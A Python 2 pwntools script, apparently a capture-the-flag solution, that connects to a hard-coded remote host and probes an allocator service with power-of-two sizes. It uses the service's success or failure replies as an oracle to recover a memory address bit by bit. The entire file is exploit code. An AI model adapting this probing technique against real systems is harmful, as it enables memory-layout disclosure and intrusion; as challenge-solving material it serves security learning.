from pwn import *

buf = 0 
while 1:
	try:
		#s = remote("localhost",4444)
		s = remote("54.202.7.144", 6969)

		s.recvuntil(":")

		def alloc(sz):
			s.sendline("a")
			s.recvuntil("sz")
			s.sendline("%d" % sz)

			s.recvuntil("? ")
			buf = s.clean(.3)
			if buf.count("FAIL") or buf.count("wait around"):
				return False
			else:
				s.sendline("y")
				print repr(buf)
				s.clean()
				return True

		while 1:
			if buf:
				start = i+2
			else:
				start = 64
			for i in xrange(start,0,-1):
				if alloc(buf+(1<<i)):
					print hex(buf+(1<<i))
					break
				else:
					print i
			buf += (1<<i)
			if i == 0:
				exit(1)
	except EOFError:
		print "restart!", hex(buf+0x11000), buf+0x11000
		pass
